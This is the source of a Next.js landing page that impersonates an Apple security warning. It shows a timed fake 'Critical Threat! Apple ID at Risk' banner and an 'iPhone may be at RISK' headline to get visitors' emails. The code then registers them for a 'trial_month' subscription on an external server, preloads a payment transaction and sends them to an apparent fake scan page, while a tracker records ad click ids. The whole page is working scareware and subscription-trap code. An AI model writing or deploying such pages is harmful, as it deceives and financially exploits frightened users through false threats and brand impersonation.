'use client'

import { useEffect, useState, useRef, FormEvent, Suspense } from 'react'
import { useRouter } from 'next/navigation'
import Link from 'next/link'
import Tracker from '../components/Tracker' // Импортируем ваш трекер!

// Вспомогательная функция для чтения кук перед отправкой (если localStorage пуст)
function getCookie(name: string) {
	if (typeof document === 'undefined') return null
	const nameEQ = name + '='
	const ca = document.cookie.split(';')
	for (let i = 0; i < ca.length; i++) {
		let c = ca[i].trim()
		if (c.indexOf(nameEQ) === 0)
			return decodeURIComponent(c.substring(nameEQ.length, c.length))
	}
	return null
}

export default function HomePage() {
	const router = useRouter()
	const emailRef = useRef<HTMLInputElement>(null)

	const [email, setEmail] = useState('')
	const [isValid, setIsValid] = useState(false)
	const [isError, setIsError] = useState(false)
	const [isSubmitting, setIsSubmitting] = useState(false)
	const [showBanner, setShowBanner] = useState(false)

	useEffect(() => {
		// Появление плашки (Danger Alert) через 1 секунду
		const timer = setTimeout(() => setShowBanner(true), 1000)
		return () => clearTimeout(timer)
	}, [])

	// Валидация Email
	const validateEmail = (val: string) => {
		const emailRegex = /^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}$/
		setIsValid(emailRegex.test(val))
	}

	// Обработка ввода (фильтрация кириллицы и спецсимволов)
	const handleEmailChange = (e: React.ChangeEvent<HTMLInputElement>) => {
		let value = e.target.value
		value = value.replace(/[А-Яа-яЁё]/g, '')
		value = value.replace(/[^A-Za-z0-9@._%+-]/g, '')

		setEmail(value)
		setIsError(false)
		validateEmail(value)
	}

	// Запрет ввода кириллицы с клавиатуры
	const handleKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
		if (e.key && e.key.length === 1 && /[А-Яа-яЁё]/.test(e.key)) {
			e.preventDefault()
		}
	}

	// Быстрые кнопки доменов
	const appendDomain = (domain: string) => {
		const username = email.split('@')[0]
		const newEmail = username + domain
		setEmail(newEmail)
		setIsError(false)
		validateEmail(newEmail)

		// Возвращаем фокус и курсор
		if (emailRef.current) {
			emailRef.current.focus()
			if (username === '') {
				setTimeout(() => {
					if (emailRef.current) {
						emailRef.current.type = 'text'
						emailRef.current.setSelectionRange(0, 0)
						emailRef.current.type = 'email'
					}
				}, 10)
			}
		}
	}

	// Отправка данных (SIGN IN)
	const handleSubmit = async (e: FormEvent) => {
		e.preventDefault()

		if (!isValid) {
			setIsError(true)
			emailRef.current?.focus()
			return
		}

		if (isSubmitting) return

		setIsSubmitting(true)
		const emailValue = email.trim()

		// Очистка старых данных, если юзер сменил почту
		const currentSavedEmail = sessionStorage.getItem('userEmail')
		if (currentSavedEmail && currentSavedEmail !== emailValue) {
			sessionStorage.removeItem('isLoggedIn')
			sessionStorage.removeItem('accessToken')
			sessionStorage.removeItem('refreshToken')
		}

		// Достаем clickid, который сохранил ваш компонент Tracker
		const clickId =
			localStorage.getItem('clickid') || getCookie('clickid') || ''
		const PLAN_CODE = 'trial_month'

		try {
			const response = await fetch(
				'https://wa-adminn.com/api/v1/register/',
				{
					method: 'POST',
					headers: { 'Content-Type': 'application/json' },
					body: JSON.stringify({
						email: emailValue,
						subscription_type_code: PLAN_CODE,
						click_id: clickId,
						clickid: clickId,
					}),
				},
			)

			const data = await response.json()

			if (response.ok) {
				// Успех: сохраняем данные
				if (data.truegate_external_user_id) {
					localStorage.setItem('tg_user_id', data.truegate_external_user_id)
				}
				sessionStorage.setItem('userEmail', emailValue)

				// Предзагрузка платежного виджета
				try {
					const wRes = await fetch(
						'https://wa-adminn.com/api/v1/subscription-payment-widget/',
						{
							method: 'POST',
							headers: { 'Content-Type': 'application/json' },
							body: JSON.stringify({
								subscription_type_code: PLAN_CODE,
								email: emailValue,
							}),
						},
					)
					const wData = await wRes.json()
					if (wData?.payment_widget?.transactionId) {
						sessionStorage.setItem(
							'preloadedTxId',
							wData.payment_widget.transactionId,
						)
					}
				} catch (e) {
					console.error('Preload error', e)
				}

				// Переход на сканирование с сохранением параметров URL
				router.push('/scan2' + window.location.search)
			} else {
				alert(
					data.error || 'Error: Could not create account. Try another email.',
				)
				setIsSubmitting(false)
			}
		} catch (error) {
			alert('Network error. Please try again.')
			setIsSubmitting(false)
		}
	}

	return (
		<>
			{/* Оборачиваем трекер в Suspense для поддержки SSR */}
			<Suspense fallback={null}>
				<Tracker />
			</Suspense>

			{/* Стили специально для этой страницы */}
			<style
				dangerouslySetInnerHTML={{
					__html: `
				* { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
				body { display: flex; justify-content: center; align-items: center; background: #f0f1f4; min-height: 100vh;}
				.mobile-container { width: 100%; max-width: 430px; position: relative; overflow: hidden; display: flex; flex-direction: column; background: #fff; }
				
				.notification-banner { position: absolute; top: 15px; left: 30px; right: 30px; background: #ABA6A6CF; border-radius: 23px; padding: 14px; display: flex; align-items: center; z-index: 100; gap: 10px; opacity: 0; transform: translateY(-20px); transition: opacity 0.5s ease, transform 0.5s ease; pointer-events: none; }
				.notification-banner.show { opacity: 1; transform: translateY(0); pointer-events: auto; }
				.notif-content { flex-grow: 1; }
				.notif-title { font-weight: 500; font-size: 16px; color: #000; }
				.notif-desc { font-size: 13px; color: #000000; }
				.text-red { font-weight: 500; font-size: 16px; color: #F81919; }
				.notif-time { font-size: 13px; color: #000000; }
				
				.main-content { flex-grow: 1; display: flex; flex-direction: column; align-items: center; padding: 120px 16px 50px; text-align: center; gap: 24px; }
				.headline { font-weight: 600; font-size: 32px; text-align: center; line-height: 1.1; }
				.headline .red { color: #F81919; }
				.subtitle { font-size: 17px; color: #85858C; }
				
				.input-group { width: 100%; }
				input[type="email"] { width: 100%; padding: 16px; border-radius: 30px; border: 1px solid transparent; background: #78788029; font-size: 16px; color: #000; outline: none; transition: 0.2s border; }
				input[type="email"]::placeholder { color: #1c1c1e; }
				input.error-border { border: 1px solid red !important; }
				
				.quick-emails { display: flex; justify-content: space-between; width: 100%; gap: 4px; }
				.quick-btn { flex: 1; padding: 16px; border: none; background-color: #e5e5ea; border-radius: 100px; font-size: 14px; color: #333; cursor: pointer; transition: 0.2s opacity; }
				.quick-btn:active { opacity: 0.7; }
				
				.sign-in-btn { width: 100%; padding: 16px; border: none; border-radius: 100px; background-color: #007BFF; color: white; font-size: 17px; font-weight: 600; cursor: pointer; transition: background-color 0.3s ease, opacity 0.3s ease; text-align: center; display: block; }
				.sign-in-btn:disabled { opacity: 0.5; background-color: #A0C4FF; cursor: not-allowed; }
				
				.footer { margin-top: auto; padding-bottom: 30px; text-align: center; }
				.privacy-link { color: #007aff; font-size: 13px; font-weight: 700; text-transform: uppercase; text-decoration: none; display: block; margin-bottom: 10px; }
				.copyright { color: #8e8e93; font-size: 13px; }
			`,
				}}
			/>

			<div className='mobile-container'>
				{/* Всплывающее уведомление */}
				<div className={`notification-banner ${showBanner ? 'show' : ''}`}>
					<div className='notif-icon'>
						<img src='/img/setting.svg' alt='setting' />
					</div>
					<div className='notif-content'>
						<div className='notif-title'>Critical Threat! Apple ID at Risk</div>
						<div className='notif-desc'>
							Risk: <span className='text-red'>Extreme Danger</span>
						</div>
					</div>
					<div className='notif-time'>now</div>
				</div>

				<div className='main-content'>
					<img src='/img/apple.svg' alt='apple' />

					<h1 className='headline'>
						Your <span className='red'>iPhone</span>
						<br />
						may be at <span className='red'>RISK</span>
					</h1>

					<p className='subtitle'>
						Register to start resolving
						<br />
						potential security risks
					</p>

					<div className='input-group'>
						<input
							ref={emailRef}
							type='email'
							placeholder='name@gmail.com'
							value={email}
							onChange={handleEmailChange}
							onKeyDown={handleKeyDown}
							className={isError ? 'error-border' : ''}
						/>
					</div>

					<div className='quick-emails'>
						<button
							type='button'
							className='quick-btn'
							onClick={() => appendDomain('@gmail.com')}
						>
							@gmail.com
						</button>
						<button
							type='button'
							className='quick-btn'
							onClick={() => appendDomain('@yahoo.com')}
						>
							@yahoo.com
						</button>
						<button
							type='button'
							className='quick-btn'
							onClick={() => appendDomain('@hotmail.com')}
						>
							@hotmail.com
						</button>
					</div>

					<button
						className='sign-in-btn'
						disabled={!isValid || isSubmitting}
						onClick={handleSubmit}
					>
						{isSubmitting ? 'SIGNING IN...' : 'Sign in'}
					</button>
				</div>

				<div className='footer'>
					<Link href='/policy' target='_blank' className='privacy-link'>
						Privacy Policy
					</Link>
					<div className='copyright'>© 2026. All rights reserved.</div>
				</div>
			</div>
		</>
	)
}
